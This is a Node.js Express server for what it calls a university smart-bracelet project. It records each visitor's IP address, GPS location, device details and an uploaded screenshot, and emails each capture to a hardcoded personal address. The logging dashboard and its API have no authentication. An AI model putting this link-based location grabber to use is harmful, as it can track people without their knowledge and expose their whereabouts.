const express = require('express');
const fs = require('fs');
const path = require('path');
const Database = require('better-sqlite3');
const nodemailer = require('nodemailer');

const app = express();
const PORT = process.env.PORT || 3000;

// Configuración de email
const EMAIL_TO = 'shoncita1@gmail.com';

// Crear transporter de email (usando Gmail)
// IMPORTANTE: Configurar con variables de entorno o directamente aquí
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: process.env.EMAIL_USER || 'tu-email@gmail.com', // Email de Gmail
        pass: process.env.EMAIL_PASS || 'tu-contraseña-de-aplicacion' // Contraseña de aplicación
    }
});

// Función para enviar email con la ubicación
async function sendLocationEmail(visitData) {
    const mapsUrl = visitData.latitude && visitData.longitude 
        ? `https://www.google.com/maps?q=${visitData.latitude},${visitData.longitude}`
        : 'Sin ubicación GPS';

    const mailOptions = {
        from: `Pulsera Inteligente <${process.env.EMAIL_USER || 'tu-email@gmail.com'}>`,
        to: EMAIL_TO,
        subject: '🚨 Nueva Ubicación Capturada - Pulsera Inteligente',
        html: `
            <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
                <div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 20px; text-align: center;">
                    <h1>📍 Pulsera Inteligente</h1>
                    <p>Nueva ubicación detectada</p>
                </div>
                
                <div style="padding: 20px; background: #f5f5f5;">
                    <h2 style="color: #667eea;">📊 Información Capturada</h2>
                    
                    <div style="background: white; padding: 15px; border-radius: 8px; margin-bottom: 15px;">
                        <p><strong>🕐 Fecha y Hora:</strong><br>${new Date(visitData.timestamp).toLocaleString('es-ES')}</p>
                    </div>

                    <div style="background: white; padding: 15px; border-radius: 8px; margin-bottom: 15px;">
                        <p><strong>🌐 Dirección IP:</strong><br>${visitData.ip}</p>
                    </div>

                    ${visitData.latitude && visitData.longitude ? `
                        <div style="background: white; padding: 15px; border-radius: 8px; margin-bottom: 15px;">
                            <p><strong>📍 Ubicación GPS:</strong></p>
                            <p>Latitud: ${visitData.latitude.toFixed(6)}</p>
                            <p>Longitud: ${visitData.longitude.toFixed(6)}</p>
                            <p>Precisión: ${visitData.accuracy ? visitData.accuracy.toFixed(0) + ' metros' : 'N/A'}</p>
                            <p style="margin-top: 10px;">
                                <a href="${mapsUrl}" 
                                   style="background: #4caf50; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; display: inline-block;">
                                   🗺️ Ver en Google Maps
                                </a>
                            </p>
                        </div>
                    ` : `
                        <div style="background: #fff3cd; padding: 15px; border-radius: 8px; margin-bottom: 15px;">
                            <p><strong>⚠️ Ubicación GPS no disponible</strong></p>
                        </div>
                    `}

                    <div style="background: white; padding: 15px; border-radius: 8px; margin-bottom: 15px;">
                        <p><strong>📱 Dispositivo:</strong><br>${visitData.user_agent}</p>
                    </div>

                    <div style="background: white; padding: 15px; border-radius: 8px; margin-bottom: 15px;">
                        <p><strong>🔢 ID de Registro:</strong> ${visitData.id}</p>
                    </div>
                </div>

                <div style="padding: 20px; text-align: center; color: #666; font-size: 12px;">
                    <p>Este es un mensaje automático del sistema de Pulsera Inteligente</p>
                    <p>Proyecto Universitario - 2026</p>
                </div>
            </div>
        `
    };

    try {
        await transporter.sendMail(mailOptions);
        console.log('✅ Email enviado a:', EMAIL_TO);
        return true;
    } catch (error) {
        console.error('❌ Error enviando email:', error.message);
        return false;
    }
}

// Middleware
app.use(express.json({ limit: '50mb' }));
app.use(express.static('public'));

// Crear carpeta de logs si no existe
const logsDir = path.join(__dirname, 'logs');
const screenshotsDir = path.join(__dirname, 'logs', 'screenshots');
if (!fs.existsSync(logsDir)) {
    fs.mkdirSync(logsDir);
}
if (!fs.existsSync(screenshotsDir)) {
    fs.mkdirSync(screenshotsDir);
}

// Inicializar base de datos SQLite
const db = new Database(path.join(__dirname, 'bracelet_tracking.db'));

// Crear tabla si no existe
db.exec(`
    CREATE TABLE IF NOT EXISTS visits (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp TEXT NOT NULL,
        ip TEXT NOT NULL,
        latitude REAL,
        longitude REAL,
        accuracy REAL,
        user_agent TEXT,
        screenshot_file TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )
`);

console.log('✅ Base de datos inicializada correctamente');

// Función para obtener la IP real del visitante
function getClientIP(req) {
    return req.headers['x-forwarded-for']?.split(',')[0].trim() || 
           req.headers['x-real-ip'] || 
           req.connection.remoteAddress || 
           req.socket.remoteAddress ||
           req.connection.socket?.remoteAddress;
}

// Ruta principal - la página que abrirán
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Ruta para registrar la visita con geolocalización
app.post('/api/log-visit', (req, res) => {
    const ip = getClientIP(req);
    const timestamp = new Date().toISOString();
    const userAgent = req.headers['user-agent'];
    const { screenshot, latitude, longitude, accuracy } = req.body;

    let screenshotFilename = null;

    // Guardar captura si se envió
    if (screenshot) {
        try {
            screenshotFilename = `screenshot_${Date.now()}.png`;
            const screenshotPath = path.join(screenshotsDir, screenshotFilename);
            
            // Remover el prefijo 'data:image/png;base64,'
            const base64Data = screenshot.replace(/^data:image\/\w+;base64,/, '');
            fs.writeFileSync(screenshotPath, base64Data, 'base64');
        } catch (error) {
            console.error('Error guardando captura:', error);
        }
    }

    // Guardar en base de datos
    try {
        const stmt = db.prepare(`
            INSERT INTO visits (timestamp, ip, latitude, longitude, accuracy, user_agent, screenshot_file)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        `);
        
        const result = stmt.run(
            timestamp,
            ip,
            latitude || null,
            longitude || null,
            accuracy || null,
            userAgent,
            screenshotFilename
        );

        const visitId = result.lastInsertRowid;

        console.log('✅ Visita registrada en BD:', {
            id: visitId,
            ip,
            location: latitude && longitude ? `${latitude}, ${longitude}` : 'Sin ubicación',
            screenshot: screenshotFilename ? '✓' : '✗'
        });

        // Enviar email con la información
        const visitData = {
            id: visitId,
            timestamp,
            ip,
            latitude: latitude || null,
            longitude: longitude || null,
            accuracy: accuracy || null,
            user_agent: userAgent,
            screenshot_file: screenshotFilename
        };

        // Enviar email de forma asíncrona (no bloquear la respuesta)
        sendLocationEmail(visitData).then(emailSent => {
            if (emailSent) {
                console.log('📧 Email enviado exitosamente');
            }
        });

        res.json({ 
            success: true, 
            message: 'Visita registrada correctamente',
            visitId: visitId
        });
    } catch (error) {
        console.error('Error guardando en BD:', error);
        res.status(500).json({ success: false, message: 'Error al guardar' });
    }
});

// Ruta para ver el dashboard (solo para ti)
app.get('/dashboard', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

// API para obtener las visitas registradas
app.get('/api/visits', (req, res) => {
    try {
        const visits = db.prepare('SELECT * FROM visits ORDER BY created_at DESC').all();
        res.json(visits);
    } catch (error) {
        console.error('Error obteniendo visitas:', error);
        res.status(500).json({ error: 'Error al obtener visitas' });
    }
});

// Servir las capturas de pantalla
app.use('/screenshots', express.static(screenshotsDir));

app.listen(PORT, '0.0.0.0', () => {
    console.log(`
╔════════════════════════════════════════════════════════╗
║  📍 Pulsera Inteligente - Sistema Iniciado           ║
╚════════════════════════════════════════════════════════╝

📱 Link de la pulsera: http://localhost:${PORT}
📊 Dashboard (solo para ti): http://localhost:${PORT}/dashboard

⚠️  Para activar desde tu celular:
    1. Asegúrate de estar en la misma red WiFi
    2. Busca tu IP local (ipconfig en Windows)
    3. Usa: http://TU_IP_LOCAL:${PORT}
    4. Acepta los permisos de ubicación GPS

💾 Base de datos: bracelet_tracking.db
📁 Capturas guardadas en: ${screenshotsDir}
    `);
});
